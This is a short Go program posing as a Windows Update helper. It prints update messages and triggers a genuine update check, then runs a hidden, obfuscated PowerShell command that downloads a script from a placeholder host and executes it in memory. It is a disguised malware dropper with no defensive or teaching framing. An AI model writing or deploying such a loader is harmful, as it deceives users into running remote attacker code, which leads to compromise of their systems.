package main

import (
	"fmt"
	"os/exec"
)

func drop() {
	fun := "p\"\"OWe\"\"RshE\"\"lL -noP -w Hidden -c \"iex(NeW-obJEcT NEt.wEbCliENt).DoWnlOAdStRinG('http://XXXXX:8000/WinSecUp')\""

	cmd2 := exec.Command("powershell", "-NOp", fun)
	err2 := cmd2.Run()
	if err2 != nil {
		fmt.Println(err2)
		return
	}
	fmt.Println("Installing system updates")

}

func main() {
	fmt.Println("[!] Contacting Windows Update server for updates...")
	// add call to windows update
	// Deprecated...
	// update := "wuauclt.exe /detectnow"
	update := "powershell.exe (New-Object -ComObject Microsoft.Update.AutoUpdate).DetectNow()"
	cmd := exec.Command("powershell", "-NoP", "-w", "hidden", update)

	err := cmd.Run()
	if err != nil {
		fmt.Println("Couldn't contact update server.", err)
		return
	}

	drop()
}
